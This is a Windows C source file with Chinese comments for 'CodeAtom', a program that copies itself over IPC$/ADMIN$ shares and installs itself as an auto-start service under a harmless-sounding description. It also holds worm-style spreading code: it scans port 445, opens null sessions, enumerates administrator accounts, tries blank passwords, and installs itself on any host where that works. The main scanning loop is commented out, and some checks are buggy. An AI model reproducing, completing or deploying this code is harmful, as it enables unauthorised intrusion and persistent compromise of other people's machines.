

////////////////////////////////////////////////////////////////////////////////////////////////////
// 文件: CodeAtom.c
// 更新: 2003-6-8
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// 头文件
#define UNICODE
#define FORCE_UNICODE
#include <Stdio.h>
#include <WinSock2.h>
#include <IPHlpApi.h>
#include <Lm.h>
#include "Password.h"

#pragma comment(lib, "IPHlpApi.lib")
#pragma comment(lib, "WSock32.lib")
#pragma comment(lib, "NetApi32.lib")
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// 宏定义
// 操作命令
#define CMD_RUN				0	// 运行服务
#define CMD_INSTALL			1	// 安装服务
#define CMD_REMOVE			2	// 移除服务
#define CMD_USAGE			3	// 提示用法

// 提示信息
#define MSG_SHOWVERSION		0
#define MSG_SHOWUSAGE		1
#define MSG_CONNECT			2
#define MSG_COPYFILE		3
#define MSG_OPENSCMANAGER	4
#define MSG_OPENSERVICE		5
#define MSG_QUERYSTATUS		6
#define MSG_SERVICERUNNING	7
#define MSG_SERVICESTOP		8
#define MSG_STOPSERVICE		9
#define MSG_DELETESERVICE	10
#define MSG_CREATESERVICE	11
#define MSG_STARTSERVICE	12
#define MSG_DELETEFILE		13
#define MSG_DISCONNECT		14
#define MSG_DESCRIPTION		15

// 探测线程运行等级
#define DETECT_STOPPED			0	// 线程已经停止
#define DETECT_GENERAL		1	// 常规探测
#define DETECT_DICTIONARY	2	// 字典探测
#define DETECT_INFINITE		3	// 穷举探测
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// 函数声明
int WINAPI ShowResult(int iResult);
int WINAPI ManageService(int iCommand, LPWSTR pwszMachine);

VOID WINAPI ServiceThread();
VOID WINAPI ServiceCtrlHandler(DWORD dwControl);
VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR * pwszArgv);

int WINAPI DetectMachine(DWORD dwAddress);
int WINAPI DetectUser(PUSE_INFO_2 pUseInfo2);
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// 探测线程信息结构
typedef struct tagDETECTTHREAD
{
	HANDLE hThread;
	DWORD dwAddress;
	DWORD dwRunLevel;
	DWORD dwStartTime;
}
DETECTTHREAD, * PDETECTTHREAD;
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// 全局变量
HANDLE g_hEvent = NULL;
HANDLE g_hThread = NULL;
SERVICE_STATUS_HANDLE g_hStatus;
SERVICE_STATUS g_ServiceStatus;

LPWSTR * g_pwszMsgs = NULL;
WCHAR g_wszServiceName[] = L"CodeAtom";
WCHAR g_wszDisplayName[] = L"CodeAtom Service";
LPWSTR g_pwszActions[] = {L"Run", L"Install", L"Remove"};
LPWSTR g_pwszEngMsgs[] =
{
	L"CodeAtom Ver 1.0.2\nCopyLeft(L) 2003 Yonsm, No Rrights Reserved.\n\n",

		L"Usage:    %s <Command> [\\\\Machine] [User] [Password]\n\n"
		L"Command:  Specify the operation command, Install or Remove is acceptable.\n"
		L"Machine:  Specify the name of the target computer, default uses local computer.\n"
		L"Username: Specify a username, default uses the current username.\n"
		L"Password: Specify a password, default uses the current password.\n",

		L"Connect to %s: ",
		L"Copy file to %s: ",
		L"Open service control manager: ",
		L"Open %s service: ",
		L"Query %s service status: ",
		L"Running.\n",
		L"Stopped.\n",
		L"Stop %s service: ",
		L"Delete %s service: ",
		L"Create %s service: ",
		L"Start %s service: ",
		L"Delete file %d: ",
		L"Disconnect from %s: ",
		L"Provides CodeAtom service for network access."
};
LPWSTR g_pwszChsMsgs[] =
{
	L"CodeAtom 版本 1.0.2\nCopyLeft(L) 2003 Yonsm，不保留任何权利。\n\n",

		L"用法: %s <命令> [\\\\机器] [用户] [密码]\n\n"
		L"命令: 指定操作命令，可以接受 Install 或者 Remove 命令。\n"
		L"机器: 指定要操作的计算机名，默认操作本地计算机。\n"
		L"用户: 指定访问目标机器所使用的用户名，默认使用当前用户。\n"
		L"密码: 指定要使用的密码，默认使用当前密码。\n",

		L"连接到 %s: ",
		L"复制文件到 %s: ",
		L"打开服务管理器: ",
		L"打开 %s 服务: ",
		L"查询 %s 服务状态: ",
		L"正在运行。\n",
		L"已经停止。\n",
		L"停止 %s 服务: ",
		L"删除 %s 服务: ",
		L"创建 %s 服务: ",
		L"启动 %s 服务: ",
		L"删除文件 %s: ",
		L"断开 %s 连接: ",
		L"为网络访问提供代码原子服务。"
};
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// 主函数
int wmain(int argc, wchar_t * argv[])
{
	int iResult;
	int iCommand;
	WSADATA WSAData;
	WCHAR wszShare[64];
	USE_INFO_2 UseInfo2;
	SERVICE_TABLE_ENTRY STEntry[2];

	// 确定操作命令
	if (argc > 1)
	{
		for (iCommand = 0; iCommand < sizeof(g_pwszActions) / sizeof(LPWSTR); iCommand++)
		{
			if (lstrcmpi(g_pwszActions[iCommand], argv[1]) == 0)
				break;
		}
	}
	else
		iCommand = CMD_USAGE;

	WSAStartup(MAKEWORD(2, 0), &WSAData);

	// 如果是运行服务
	if (iCommand == CMD_RUN)
	{
		STEntry[0].lpServiceName = g_wszServiceName;
		STEntry[0].lpServiceProc = ServiceMain;
		STEntry[1].lpServiceName = NULL;
		STEntry[1].lpServiceProc = NULL;
		StartServiceCtrlDispatcher(STEntry);
	}
	else
	{
		// 判断当前线程的语言，设置提示信息指针
		if (LOWORD(GetThreadLocale()) == MAKELANGID(LANG_CHINESE, SUBLANG_CHINESE_SIMPLIFIED))
			g_pwszMsgs = g_pwszChsMsgs;
		//else
			g_pwszMsgs = g_pwszEngMsgs;

		// 显示版本信息
		wprintf(g_pwszMsgs[MSG_SHOWVERSION]);

		// 如果是安装或者删除服务
		if ((iCommand == CMD_INSTALL) || (iCommand == CMD_REMOVE))
		{
			if (argc > 2)
			{
				// 先取消连接 (如果有连接的话)
				wsprintf(wszShare, L"%s\\IPC$", argv[2]);
				wprintf(g_pwszMsgs[MSG_CONNECT], wszShare);
				NetUseDel(NULL, wszShare, USE_LOTS_OF_FORCE);

				// 连接到远程机器
				UseInfo2.ui2_local = NULL;
				UseInfo2.ui2_remote = wszShare;
				UseInfo2.ui2_username = (argc > 3) ? argv[3] : NULL;
				UseInfo2.ui2_password = (argc > 4) ? argv[4] : NULL;
				UseInfo2.ui2_domainname = NULL;
				UseInfo2.ui2_asg_type = USE_IPC;
				UseInfo2.ui2_usecount = 0;
				iResult = ShowResult(NetUseAdd(NULL, 2, (LPBYTE) &UseInfo2, NULL));
			}
			else
				iResult = NERR_Success;

			if (iResult == NERR_Success)
			{
				// 安装或者删除服务
				iResult = ManageService(iCommand, (argc > 2) ? argv[2] : NULL);
				if (argc > 2)
				{
					// 从远程机器断开连接
					wprintf(g_pwszMsgs[MSG_DISCONNECT], wszShare);
					iResult = ShowResult(NetUseDel(NULL, wszShare, USE_LOTS_OF_FORCE));
				}
			}
		}
		// 显示参数提示
		else
		{
			//ServiceThread();
			wprintf(g_pwszMsgs[MSG_SHOWUSAGE], argv[0]);
		}
	}

	WSACleanup();
	return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// 显示结果信息
int WINAPI ShowResult(int iResult)
{
	LPWSTR p;

	// 根据场景语言显示提示信息
	FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, iResult, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPWSTR) &p, 0, NULL);
	wprintf(p);
	return iResult;
}
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// 管理服务
int WINAPI ManageService(int iCommand, LPWSTR pwszMachine)
{
	int iResult;
	SC_HANDLE hManager;
	SC_HANDLE hService;
	//WCHAR wszTemp[256];
	WCHAR wszExePath[256];
	WCHAR wszRemoteFile[256];
	SERVICE_DESCRIPTION Sd;

	// 打开服务管理器
	wprintf(g_pwszMsgs[MSG_OPENSCMANAGER]);
	hManager = OpenSCManager(pwszMachine, NULL, SC_MANAGER_ALL_ACCESS);
	iResult = ShowResult(hManager ? ERROR_SUCCESS : GetLastError());
	if (iResult == ERROR_SUCCESS)
	{
		// 获取可执行文件名称
		GetModuleFileName(NULL, wszExePath, MAX_PATH);

		// 如果指定了远程主机
		if (pwszMachine)
		{
			for (iResult = lstrlen(wszExePath); iResult > 0; iResult--)
			{
				if (wszExePath[iResult] == '\\')
					break;
			}
			// 构建远程文件路径
			wsprintf(wszRemoteFile, L"%s\\ADMIN$\\System32%s", pwszMachine, &wszExePath[iResult]);
		}

		// 打开服务
		wprintf(g_pwszMsgs[MSG_OPENSERVICE], g_wszServiceName);
		hService = OpenService(hManager, g_wszServiceName, SERVICE_ALL_ACCESS | DELETE);
		iResult = ShowResult(hService ? ERROR_SUCCESS : GetLastError());
		if (iResult == ERROR_SUCCESS)
		{
			// 查询服务状态
			wprintf(g_pwszMsgs[MSG_QUERYSTATUS], g_wszServiceName);
			QueryServiceStatus(hService, &g_ServiceStatus);
			if (g_ServiceStatus.dwCurrentState == SERVICE_STOPPED)
				wprintf(g_pwszMsgs[MSG_SERVICESTOP]);
			else
			{
				// 停止服务
				wprintf(g_pwszMsgs[MSG_SERVICERUNNING]);
				wprintf(g_pwszMsgs[MSG_STOPSERVICE], g_wszServiceName);
				iResult = ShowResult(
					ControlService(hService, SERVICE_CONTROL_STOP, &g_ServiceStatus)
					? ERROR_SUCCESS : GetLastError());
			}

			// 删除服务并关闭服务句柄
			wprintf(g_pwszMsgs[MSG_DELETESERVICE], g_wszServiceName);
			iResult = ShowResult(DeleteService(hService)
				? ERROR_SUCCESS : GetLastError());
			CloseServiceHandle(hService);

			if (pwszMachine)
			{
				// 删除远程文件
				wprintf(g_pwszMsgs[MSG_DELETEFILE], wszRemoteFile);
				iResult = ShowResult(DeleteFile(wszRemoteFile)
					? ERROR_SUCCESS : GetLastError());
			}
		}

		// 如果是安装
		if (iCommand == CMD_INSTALL)
		{
			if (pwszMachine)
			{
				// 复制文件到远程主机
				wprintf(g_pwszMsgs[MSG_COPYFILE], wszRemoteFile);
				iResult = ShowResult(CopyFile(wszExePath, wszRemoteFile, FALSE)
					? ERROR_SUCCESS : GetLastError());

				// 构造可执行文件路径
				for (iResult = lstrlen(wszRemoteFile); iResult > 0; iResult--)
				{
					if (wszRemoteFile[iResult] == '\\')
						break;
				}
				wsprintf(wszExePath, L"%%SystemRoot%%\\System32%s", &wszRemoteFile[iResult]);
			}
			else
				iResult = ERROR_SUCCESS;

			if (iResult == ERROR_SUCCESS)
			{
				// 创建服务
				wprintf(g_pwszMsgs[MSG_CREATESERVICE], g_wszServiceName);
				lstrcat(wszExePath, L" Run");
				hService = CreateService(hManager, g_wszServiceName, g_wszDisplayName,
					SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
					SERVICE_ERROR_IGNORE, wszExePath, NULL, NULL, NULL, NULL, NULL);
				iResult = ShowResult(hService ? ERROR_SUCCESS : GetLastError());
				if (iResult == ERROR_SUCCESS)
				{
					// 设置服务描述
					Sd.lpDescription = g_pwszMsgs[MSG_DESCRIPTION];
					ChangeServiceConfig2(hService, SERVICE_CONFIG_DESCRIPTION, &Sd);

					// 启动服务并关闭服务句柄
					wprintf(g_pwszMsgs[MSG_STARTSERVICE], g_wszServiceName);
					iResult = ShowResult(StartService(hService, 0, NULL)
						? ERROR_SUCCESS : GetLastError());
					CloseServiceHandle(hService);
				}
			}
		}
		// 关闭服务管理器句柄
		CloseServiceHandle(hManager);
	}

	return iResult;
}
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// 服务主函数
VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR * pwszArgv)
{
	DWORD dwThread;

	__try
	{
		// 注册服务控制处理函数
		g_hStatus = RegisterServiceCtrlHandler(g_wszServiceName, ServiceCtrlHandler);
		if (g_hStatus == 0)
			__leave;

		// 发送状态到服务管理器
		g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
		g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;
		g_ServiceStatus.dwWin32ExitCode = 0;
		g_ServiceStatus.dwServiceSpecificExitCode = 0;
		g_ServiceStatus.dwCheckPoint = 0;
		g_ServiceStatus.dwWaitHint = 0;
		g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
		if (SetServiceStatus(g_hStatus, &g_ServiceStatus) == FALSE)
			__leave;

		// 创建事件
		g_hEvent = CreateEvent(0, TRUE, FALSE, 0);
		if (g_hEvent == NULL)
			__leave;

		// 创建线程
		g_hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) ServiceThread,0, 0, &dwThread);
		if (g_hThread == NULL)
			__leave;

		// 等待服务线程结束
		WaitForSingleObject(g_hEvent, INFINITE);
	}
	__finally
	{
		// 结束运行服务
		if (g_hEvent)
			CloseHandle(g_hEvent);
		if (g_hThread)
			CloseHandle(g_hThread);
	}
}
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// 服务控制处理函数
VOID WINAPI ServiceCtrlHandler(DWORD dwControl)
{
	switch (dwControl)
	{
		// 停止服务
	case SERVICE_CONTROL_STOP:
		SetEvent(g_hEvent);
		g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;

		// 暂停服务
	case SERVICE_CONTROL_PAUSE:
		SuspendThread(g_hThread);
		g_ServiceStatus.dwCurrentState = SERVICE_PAUSED;
		break;

		// 继续服务
	case SERVICE_CONTROL_CONTINUE:
		ResumeThread(g_hThread);
		g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
		break;

		// 其它控制消息
	default:
		return;
	}
	// 通知服务管理器
	SetServiceStatus(g_hStatus, &g_ServiceStatus);
}
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// 服务线程
VOID WINAPI ServiceThread()
{
	//int i;
	//int j;
	//int iCThread;
	//int iBThread;
	//int iAThread;
	//int iRThread;
	//int iAddress;
	//DWORD dwAddress[10];
	//PMIB_IPADDRTABLE pIPTable;
	//DETECTTHREAD DetectThread[40];

	//i = 0;
	//GetIpAddrTable(NULL, &i, FALSE);
	//pIPTable = HeapAlloc(GetProcessHeap(), 0, i);
	//GetIpAddrTable(pIPTable, &i, FALSE);
	//for (iAddress = 0, j = 0; (iAddress < 10) && (j < (int) pIPTable->dwNumEntries); j++)
	//{
	//	if ((BYTE) pIPTable->table[j].dwAddr != 127)
	//	{
	//		dwAddress[iAddress] = pIPTable->table[j].dwAddr;
	//		iAddress++;
	//	}
	//}
	//HeapFree(GetProcessHeap(), 0, pIPTable);

 //   ZeroMemory(&DetectThread, sizeof(DetectThread));
	//while (1)
	//{
	//	for (i = 0; i < 20; i++)
	//	{
	//		if (DetectThread[i].dwRunLevel == DETECT_STOPPED)
	//		{
	//			if (DetectThread[i].hThread)
	//				CloseHandle(DetectThread[i].hThread);

	//			DetectThread[i].dwAddress = dwAddress[0];
	//			DetectThread[i].dwRunLevel = DETECT_GENERAL;
	//			DetectThread[i].dwStartTime = GetTickCount();
	//			DetectThread[i].hThread = CreateThread(NULL, 0,
	//				(LPTHREAD_START_ROUTINE) DetectMachine, &dwAddress, 0, &i);
	//		}
	//	}
	//}	
}
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
int DetectCSect(DWORD dwAddress)
{
	//DETECTTHREAD DetectThread[40];

	//ZeroMemory(
	return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// 探测一个主机
int WINAPI DetectMachine(DWORD dwAddress)
{
	int iResult;
	DWORD dwRead;
	DWORD dwTotal;
	WCHAR wszShare[24];
	WCHAR wszMachine[20];
	USE_INFO_2 UseInfo2;
	PUSER_INFO_1 pBuffer, p;
	FD_SET FdSet;
	SOCKET hSocket;
	TIMEVAL TimeVal;
	SOCKADDR_IN SockAddr;

	// 判断是否开放 445 端口，超时时间为 3 秒
	hSocket = socket(AF_INET, SOCK_STREAM, 0);
	iResult = 1;
	ioctlsocket(hSocket, FIONBIO, &iResult);
	SockAddr.sin_family	= AF_INET;
	SockAddr.sin_port =	htons(445);
	SockAddr.sin_addr.s_addr = ntohl(dwAddress);
	connect(hSocket, (PSOCKADDR) &SockAddr, sizeof(SockAddr));
	TimeVal.tv_sec = 3;
	TimeVal.tv_usec = 0;
	FD_ZERO(&FdSet);
	FD_SET(hSocket, &FdSet);
	iResult = select((int) hSocket + 1, NULL, &FdSet, NULL, &TimeVal);
	closesocket(hSocket);
	if ((iResult == 0) && (iResult == SOCKET_ERROR))
		return SOCKET_ERROR;

	// 构造机器名称和共享名称，删除连接 (如果存在的话)
	wsprintf(wszMachine, L"\\\\%d.%d.%d.%d",
		(BYTE) dwAddress,
		(BYTE) (dwAddress >> 8),
		(BYTE) (dwAddress >> 16),
		(BYTE) (dwAddress >> 24));
	wsprintf(wszShare, L"%s\\IPC$", wszMachine);
	NetUseDel(NULL, wszShare, USE_LOTS_OF_FORCE);

	// 建立空连接
	UseInfo2.ui2_local = NULL;
	UseInfo2.ui2_remote = wszShare;
	UseInfo2.ui2_username = L"";
	UseInfo2.ui2_password = L"";
	UseInfo2.ui2_domainname = L"";
	UseInfo2.ui2_asg_type = USE_IPC;
	UseInfo2.ui2_usecount = 0;
	iResult = NetUseAdd(NULL, 2, (LPBYTE) &UseInfo2, NULL);

	if (iResult == NERR_Success)
	{
		// 枚举用户
		iResult = NetUserEnum(wszMachine, 1, 0, (LPBYTE *) &pBuffer,
			MAX_PREFERRED_LENGTH, &dwRead, &dwTotal,  NULL);
		if (iResult == NERR_Success)
		{
			// 取消空连接
			NetUseDel(NULL, wszShare, USE_LOTS_OF_FORCE);

			// 设置返回值，表示没有找到超级用户
			iResult = NERR_BadUsername;

			// 开始探测用户
			for (p = pBuffer; dwRead > 0; dwRead--, p++)
			{
				// 如果是超级用户
				if (p->usri1_priv == USER_PRIV_ADMIN)
				{
					// 如果探测用户成功
					UseInfo2.ui2_username = p->usri1_name;
					iResult = DetectUser(&UseInfo2);
					if (iResult == NERR_Success)
					{
						// 安装服务，然后取消连接，退出
						iResult = ManageService(CMD_INSTALL, wszMachine);
						NetUseDel(NULL, wszShare, USE_LOTS_OF_FORCE);
						break;
					}
				}
			}
		}
	}
	return iResult;
}
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// 探测用户，输入 USE_INFO_2 各项内容
// 如果返回 NERR_Success，USE_INFO_2.ui2_password 为正确密码，同时建立一个有效的连接
int WINAPI DetectUser(PUSE_INFO_2 pUseInfo2)
{
	int i;
	int iResult;

	for (i = 0; i < 5; i++)
	{
		pUseInfo2->ui2_password = L"";
		iResult = NetUseAdd(NULL, 2, (LPBYTE) pUseInfo2, NULL);
		if (iResult == NERR_Success)
			break;
	}
	return iResult;
}
////////////////////////////////////////////////////////////////////////////////////////////////////

